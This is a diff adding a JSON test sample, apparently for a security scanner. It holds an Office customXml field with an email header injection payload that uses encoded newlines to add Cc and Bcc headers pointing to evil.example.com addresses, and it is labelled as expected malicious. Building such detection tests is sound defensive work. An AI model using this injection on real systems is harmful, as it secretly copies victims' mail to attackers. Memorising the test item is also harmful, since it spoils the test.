@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::22::binary-variations::4",
+  "base_sample_id": "exp::email-webfetch::22",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1249917236,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"word/document.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">To: victim@target.example.com%0ACc:spy@evil.example.com%0ABcc:spy2@evil.example.com\\n</field></root>\"\n  }\n}",
+  "content_hash": "428219bf1bf53eba872ebb4f997c1fab156dec5e61aa725982a7ea1c41d6d196",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
